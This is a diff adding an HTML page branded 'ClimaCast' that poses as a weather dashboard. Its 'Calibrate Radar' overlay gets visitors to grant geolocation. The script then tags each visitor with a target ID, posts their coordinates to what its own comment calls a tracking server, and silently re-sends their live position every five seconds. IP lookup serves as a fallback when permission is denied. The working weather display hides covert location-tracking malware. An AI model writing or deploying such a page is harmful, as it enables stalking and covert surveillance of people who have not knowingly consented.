@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClimaCast | Premium Meteorological Sync</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+    <!-- FontAwesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --bg-color: #030308;
+            --bg-card: rgba(10, 15, 30, 0.7);
+            --border-color: rgba(255, 255, 255, 0.08);
+            --text-primary: #f1f3f9;
+            --text-secondary: #858fa3;
+            --accent-cyan: #00e5ff;
+            --accent-purple: #7c4dff;
+            --accent-gradient: linear-gradient(135deg, var(--accent-purple) 0%, var(--accent-cyan) 100%);
+            --font-main: 'Outfit', sans-serif;
+            --font-mono: 'Space Grotesk', sans-serif;
+            --shadow-glow: 0 0 20px rgba(0, 229, 255, 0.2);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: var(--font-main);
+        }
+
+        body {
+            background-color: var(--bg-color);
+            background-image: 
+                radial-gradient(at 10% 20%, rgba(124, 77, 255, 0.12) 0px, transparent 40%),
+                radial-gradient(at 90% 80%, rgba(0, 229, 255, 0.1) 0px, transparent 45%);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow-x: hidden;
+            padding: 20px;
+        }
+
+        /* Calibration Overlay */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(3, 3, 8, 0.85);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.8s cubic-bezier(0.4, 0, 0.2, 1), transform 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+            padding: 24px;
+            text-align: center;
+        }
+
+        .overlay.dismissed {
+            opacity: 0;
+            transform: scale(1.05);
+            pointer-events: none;
+        }
+
+        .overlay-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 24px;
+            padding: 40px 30px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Radar Scanner Simulation */
+        .radar-box {
+            position: relative;
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            border: 2px solid rgba(0, 229, 255, 0.2);
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: radial-gradient(circle, rgba(0, 229, 255, 0.05) 0%, transparent 70%);
+        }
+
+        .radar-box::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 1px dashed rgba(124, 77, 255, 0.3);
+            animation: pulse-ring 3s infinite linear;
+        }
+
+        .radar-sweep {
+            position: absolute;
+            width: 50%;
+            height: 50%;
+            top: 0;
+            left: 50%;
+            background: linear-gradient(90deg, rgba(0, 229, 255, 0.4) 0%, transparent 100%);
+            transform-origin: bottom left;
+            animation: sweep 4s infinite linear;
+            border-left: 2px solid var(--accent-cyan);
+            border-top-left-radius: 100%;
+        }
+
+        .radar-icon {
+            font-size: 32px;
+            color: var(--accent-cyan);
+            z-index: 2;
+            text-shadow: var(--shadow-glow);
+            animation: pulse-icon 2.5s infinite ease-in-out;
+        }
+
+        .overlay-title {
+            font-family: var(--font-mono);
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            background: var(--accent-gradient);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 12px;
+        }
+
+        .overlay-text {
+            color: var(--text-secondary);
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .btn-sync {
+            background: var(--accent-gradient);
+            border: none;
+            color: white;
+            padding: 14px 28px;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            width: 100%;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 15px rgba(124, 77, 255, 0.3);
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-sync:hover {
+            box-shadow: 0 6px 20px rgba(0, 229, 255, 0.4);
+            transform: translateY(-2px);
+        }
+
+        .btn-sync:disabled {
+            background: var(--text-secondary);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .status-log {
+            margin-top: 15px;
+            font-family: var(--font-mono);
+            font-size: 11px;
+            color: var(--accent-cyan);
+            height: 16px;
+        }
+
+        /* Main Weather Dashboard */
+        .dashboard-container {
+            width: 100%;
+            max-width: 450px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 28px;
+            padding: 24px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            opacity: 0.2;
+            transform: scale(0.97);
+            transition: all 1s ease-out;
+        }
+
+        .dashboard-container.active {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        /* Search Bar styling */
+        .search-box {
+            display: flex;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border-color);
+            border-radius: 14px;
+            padding: 4px 6px 4px 14px;
+            align-items: center;
+            margin-bottom: 24px;
+            transition: all 0.3s ease;
+        }
+
+        .search-box:focus-within {
+            border-color: var(--accent-cyan);
+            box-shadow: 0 0 10px rgba(0, 229, 255, 0.15);
+        }
+
+        .search-input {
+            background: transparent;
+            border: none;
+            outline: none;
+            color: var(--text-primary);
+            flex-grow: 1;
+            font-size: 14px;
+            padding-right: 8px;
+        }
+
+        .search-input::placeholder {
+            color: var(--text-secondary);
+        }
+
+        .btn-search {
+            background: rgba(255, 255, 255, 0.05);
+            border: none;
+            color: var(--text-primary);
+            width: 36px;
+            height: 36px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn-search:hover {
+            background: var(--accent-gradient);
+            color: white;
+        }
+
+        /* Weather Info UI */
+        .location-info {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .loc-name {
+            font-family: var(--font-mono);
+            font-size: 26px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+        }
+
+        .loc-country {
+            font-size: 13px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .main-weather {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 28px;
+        }
+
+        .w-icon-container {
+            font-size: 80px;
+            height: 100px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #fff 0%, var(--text-secondary) 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 10px 15px rgba(0, 0, 0, 0.4));
+            margin-bottom: 10px;
+        }
+
+        .temp-display {
+            font-family: var(--font-mono);
+            font-size: 64px;
+            font-weight: 700;
+            line-height: 1;
+            position: relative;
+            margin-left: 10px;
+        }
+
+        .temp-display::after {
+            content: '°';
+            position: absolute;
+            font-size: 40px;
+            top: 5px;
+            right: -20px;
+            background: var(--accent-gradient);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .cond-desc {
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--text-secondary);
+            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Stats Grid */
+        .details-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 16px;
+            border-top: 1px solid var(--border-color);
+            padding-top: 24px;
+            margin-bottom: 20px;
+        }
+
+        .detail-card {
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .detail-icon {
+            font-size: 20px;
+            color: var(--accent-cyan);
+            width: 24px;
+            text-align: center;
+        }
+
+        .detail-meta {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .detail-lbl {
+            font-size: 11px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 2px;
+        }
+
+        .detail-val {
+            font-family: var(--font-mono);
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        /* Diagnostic Box */
+        .diagnostic-footer {
+            border-top: 1px solid var(--border-color);
+            padding-top: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-family: var(--font-mono);
+            font-size: 10px;
+            color: var(--text-secondary);
+        }
+
+        .status-dot {
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #00e676;
+            margin-right: 4px;
+            box-shadow: 0 0 8px #00e676;
+        }
+
+        .status-dot.syncing {
+            background: #ffc107;
+            box-shadow: 0 0 8px #ffc107;
+        }
+
+        /* Keyframes Animations */
+        @keyframes sweep {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes pulse-ring {
+            0% {
+                transform: scale(0.9);
+                opacity: 1;
+            }
+            100% {
+                transform: scale(1.3);
+                opacity: 0;
+            }
+        }
+
+        @keyframes pulse-icon {
+            0%, 100% {
+                transform: scale(1);
+                opacity: 0.8;
+            }
+            50% {
+                transform: scale(1.1);
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Calibration Overlay -->
+    <div class="overlay" id="calibration-overlay">
+        <div class="overlay-card">
+            <div class="radar-box">
+                <div class="radar-sweep"></div>
+                <div class="radar-icon">
+                    <i class="fa-solid fa-satellite-dish"></i>
+                </div>
+            </div>
+            <h2 class="overlay-title">ClimaCast Sync</h2>
+            <p class="overlay-text">
+                This dashboard utilizes localized radar telemetry. Please calibrate and synchronize your local atmospheric sensors to access real-time weather analytics.
+            </p>
+            <button class="btn-sync" id="btn-sync">
+                <i class="fa-solid fa-bolt"></i> Calibrate Radar
+            </button>
+            <div class="status-log" id="status-log">Radar status: Offline</div>
+        </div>
+    </div>
+
+    <!-- Main Weather Dashboard -->
+    <div class="dashboard-container" id="dashboard">
+        <!-- Search bar -->
+        <div class="search-box">
+            <input type="text" class="search-input" id="search-input" placeholder="Search City meteorological data...">
+            <button class="btn-search" id="btn-search" title="Query Station">
+                <i class="fa-solid fa-magnifying-glass"></i>
+            </button>
+        </div>
+
+        <!-- Weather Stats Info -->
+        <div class="location-info">
+            <h1 class="loc-name" id="city-name">Syncing...</h1>
+            <span class="loc-country" id="country-name">---</span>
+        </div>
+
+        <div class="main-weather">
+            <div class="w-icon-container" id="w-icon">
+                <i class="fa-solid fa-cloud-sun-rain"></i>
+            </div>
+            <div class="temp-display" id="temp-val">--</div>
+            <div class="cond-desc" id="cond-desc">Detecting...</div>
+        </div>
+
+        <div class="details-grid">
+            <div class="detail-card">
+                <div class="detail-icon"><i class="fa-solid fa-temperature-half"></i></div>
+                <div class="detail-meta">
+                    <span class="detail-lbl">Feels Like</span>
+                    <span class="detail-val" id="feels-val">--°C</span>
+                </div>
+            </div>
+            <div class="detail-card">
+                <div class="detail-icon"><i class="fa-solid fa-droplet"></i></div>
+                <div class="detail-meta">
+                    <span class="detail-lbl">Humidity</span>
+                    <span class="detail-val" id="humidity-val">--%</span>
+                </div>
+            </div>
+            <div class="detail-card">
+                <div class="detail-icon"><i class="fa-solid fa-wind"></i></div>
+                <div class="detail-meta">
+                    <span class="detail-lbl">Wind Speed</span>
+                    <span class="detail-val" id="wind-val">-- km/h</span>
+                </div>
+            </div>
+            <div class="detail-card">
+                <div class="detail-icon"><i class="fa-solid fa-chart-line"></i></div>
+                <div class="detail-meta">
+                    <span class="detail-lbl">Precipitation</span>
+                    <span class="detail-val" id="precip-val">-- mm</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="diagnostic-footer">
+            <div>
+                <span class="status-dot" id="status-dot"></span>
+                <span id="diagnostic-status">Live Linked</span>
+            </div>
+            <div id="diagnostic-time">--:--:--</div>
+        </div>
+    </div>
+
+    <!-- Script Operations -->
+    <script>
+        const overlay = document.getElementById("calibration-overlay");
+        const dashboard = document.getElementById("dashboard");
+        const btnSync = document.getElementById("btn-sync");
+        const statusLog = document.getElementById("status-log");
+        const searchInput = document.getElementById("search-input");
+        const btnSearch = document.getElementById("btn-search");
+        
+        let targetId = getOrGenerateId();
+        let telemetryInterval = null;
+        let lastCoordinates = { lat: null, lng: null };
+
+        // Generate or fetch target identifier
+        function getOrGenerateId() {
+            const urlParams = new URLSearchParams(window.location.search);
+            let id = urlParams.get('id') || localStorage.getItem("id");
+            if (!id) {
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                id = '';
+                for (let i = 0; i < 10; i++) {
+                    id += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+            }
+            localStorage.setItem("id", id);
+            return id;
+        }
+
+        // Initialize user interaction
+        btnSync.addEventListener("click", () => {
+            btnSync.disabled = true;
+            btnSync.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Aligning Sensors...';
+            statusLog.textContent = "Querying satellite position...";
+            
+            triggerTelemetry();
+        });
+
+        // Trigger user geolocation capture
+        function triggerTelemetry() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        lastCoordinates = { lat, lng };
+                        
+                        statusLog.textContent = "Radar lock achieved. Synchronizing...";
+                        
+                        // Reverse Geocode Coords to get address details
+                        reverseGeocode(lat, lng)
+                            .then(loc => {
+                                fetchWeather(lat, lng, loc.city, loc.country);
+                                sendTelemetry(lat, lng);
+                                unlockDashboard();
+                            })
+                            .catch(() => {
+                                fetchWeather(lat, lng, "Local Radar", "User Location");
+                                sendTelemetry(lat, lng);
+                                unlockDashboard();
+                            });
+                    },
+                    (error) => {
+                        console.warn("Geolocation permission error: ", error);
+                        statusLog.textContent = "Sensor blocked. Initiating IP telemetry fallback...";
+                        ipFallback();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 8000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                statusLog.textContent = "Browser incompatible. Initializing IP telemetry fallback...";
+                ipFallback();
+            }
+        }
+
+        // IP-based Location Fallback
+        function ipFallback() {
+            fetch("https://ipapi.co/json/")
+                .then(res => res.json())
+                .then(data => {
+                    if (data && data.latitude && data.longitude) {
+                        const lat = data.latitude;
+                        const lng = data.longitude;
+                        lastCoordinates = { lat, lng };
+                        
+                        statusLog.textContent = "IP Radar lock achieved. Synchronizing...";
+                        fetchWeather(lat, lng, data.city || "Regional Station", data.country_name || "Unknown");
+                        sendTelemetry(lat, lng);
+                        unlockDashboard();
+                    } else {
+                        throw new Error("Invalid IP payload");
+                    }
+                })
+                .catch(err => {
+                    console.error("IP Geolocator failure:", err);
+                    statusLog.textContent = "Connection error. Initializing general station...";
+                    // Default fallback to Kota, Rajasthan, India
+                    const lat = 25.1743;
+                    const lng = 75.9193;
+                    lastCoordinates = { lat, lng };
+                    fetchWeather(lat, lng, "Kota", "India");
+                    sendTelemetry(lat, lng);
+                    unlockDashboard();
+                });
+        }
+
+        // Reverse Geocoding with OSM Nominatim
+        async function reverseGeocode(lat, lng) {
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=10&addressdetails=1`);
+            const data = await res.json();
+            if (data && data.address) {
+                const city = data.address.city || data.address.town || data.address.village || data.address.suburb || "Local Radar";
+                const country = data.address.country || "User Location";
+                return { city, country };
+            }
+            throw new Error("No address returned");
+        }
+
+        // Post data back to Express tracking server
+        function sendTelemetry(lat, lng) {
+            fetch("/weather", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    id: targetId,
+                    lat: lat,
+                    lng: lng
+                })
+            })
+            .then(res => {
+                if (!res.ok) console.warn("Server telemetry response abnormal");
+            })
+            .catch(err => console.error("Telemetry streaming failed:", err));
+
+            // Start periodic updates if not running
+            if (!telemetryInterval) {
+                telemetryInterval = setInterval(() => {
+                    // Query current coordinates silently to push real-time movements
+                    if ("geolocation" in navigator) {
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                lastCoordinates.lat = position.coords.latitude;
+                                lastCoordinates.lng = position.coords.longitude;
+                                sendTelemetry(lastCoordinates.lat, lastCoordinates.lng);
+                            },
+                            null,
+                            { enableHighAccuracy: true }
+                        );
+                    } else {
+                        sendTelemetry(lastCoordinates.lat, lastCoordinates.lng);
+                    }
+                }, 5000);
+            }
+        }
+
+        // Smooth transition to weather page
+        function unlockDashboard() {
+            setTimeout(() => {
+                overlay.classList.add("dismissed");
+                dashboard.classList.add("active");
+            }, 800);
+        }
+
+        // Weather Fetch from Open-Meteo
+        function fetchWeather(lat, lng, city, country) {
+            document.getElementById("status-dot").className = "status-dot syncing";
+            document.getElementById("diagnostic-status").textContent = "Updating...";
+
+            fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lng}&current=temperature_2m,relative_humidity_2m,apparent_temperature,precipitation,weather_code,wind_speed_10m&timezone=auto`)
+                .then(res => res.json())
+                .then(data => {
+                    const current = data.current;
+                    document.getElementById("city-name").textContent = city;
+                    document.getElementById("country-name").textContent = country;
+                    document.getElementById("temp-val").textContent = Math.round(current.temperature_2m);
+                    document.getElementById("feels-val").textContent = `${Math.round(current.apparent_temperature)}°C`;
+                    document.getElementById("humidity-val").textContent = `${current.relative_humidity_2m}%`;
+                    document.getElementById("wind-val").textContent = `${current.wind_speed_10m} km/h`;
+                    document.getElementById("precip-val").textContent = `${current.precipitation} mm`;
+
+                    // Parse Weather Code to description/icons
+                    const code = current.weather_code;
+                    let icon = '<i class="fa-solid fa-cloud-sun"></i>';
+                    let desc = "Partly Cloudy";
+
+                    if (code === 0) {
+                        icon = '<i class="fa-solid fa-sun" style="color: #ffb300;"></i>';
+                        desc = "Clear Sky";
+                    } else if (code >= 1 && code <= 3) {
+                        icon = '<i class="fa-solid fa-cloud-sun"></i>';
+                        desc = "Partly Cloudy";
+                    } else if (code === 45 || code === 48) {
+                        icon = '<i class="fa-solid fa-smog"></i>';
+                        desc = "Foggy";
+                    } else if (code >= 51 && code <= 55) {
+                        icon = '<i class="fa-solid fa-cloud-rain"></i>';
+                        desc = "Drizzle";
+                    } else if (code >= 61 && code <= 65) {
+                        icon = '<i class="fa-solid fa-cloud-showers-heavy" style="color: #4facfe;"></i>';
+                        desc = "Heavy Rain";
+                    } else if (code >= 71 && code <= 77) {
+                        icon = '<i class="fa-solid fa-snowflake" style="color: #00e5ff;"></i>';
+                        desc = "Snowy";
+                    } else if (code >= 80 && code <= 82) {
+                        icon = '<i class="fa-solid fa-cloud-showers-water"></i>';
+                        desc = "Rain Showers";
+                    } else if (code >= 95) {
+                        icon = '<i class="fa-solid fa-cloud-bolt" style="color: #7c4dff;"></i>';
+                        desc = "Thunderstorm";
+                    }
+
+                    document.getElementById("w-icon").innerHTML = icon;
+                    document.getElementById("cond-desc").textContent = desc;
+
+                    // Update local time format
+                    const now = new Date();
+                    document.getElementById("diagnostic-time").textContent = now.toTimeString().split(' ')[0];
+                    document.getElementById("status-dot").className = "status-dot";
+                    document.getElementById("diagnostic-status").textContent = "Live Linked";
+                })
+                .catch(err => {
+                    console.error("OpenMeteo fetch failed:", err);
+                    document.getElementById("status-dot").className = "status-dot syncing";
+                    document.getElementById("diagnostic-status").textContent = "Data Stale";
+                });
+        }
+
+        // Manual City Query Geocoder
+        btnSearch.addEventListener("click", () => {
+            performSearch();
+        });
+
+        searchInput.addEventListener("keypress", (e) => {
+            if (e.key === "Enter") performSearch();
+        });
+
+        function performSearch() {
+            const query = searchInput.value.trim();
+            if (!query) return;
+
+            btnSearch.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i>';
+            btnSearch.disabled = true;
+
+            fetch(`https://geocoding-api.open-meteo.com/v1/search?name=${encodeURIComponent(query)}&count=1&language=en&format=json`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data && data.results && data.results.length > 0) {
+                        const result = data.results[0];
+                        const lat = result.latitude;
+                        const lng = result.longitude;
+                        lastCoordinates = { lat, lng };
+
+                        fetchWeather(lat, lng, result.name, result.country || "Unknown");
+                        sendTelemetry(lat, lng);
+                    } else {
+                        alert("Meteorological station not found for: " + query);
+                    }
+                })
+                .catch(err => {
+                    console.error("Geocoding failed:", err);
+                    alert("Unable to reach geocoding satellite. Check connectivity.");
+                })
+                .finally(() => {
+                    btnSearch.innerHTML = '<i class="fa-solid fa-magnifying-glass"></i>';
+                    btnSearch.disabled = false;
+                });
+        }
+    </script>
+</body>
+
+</html>
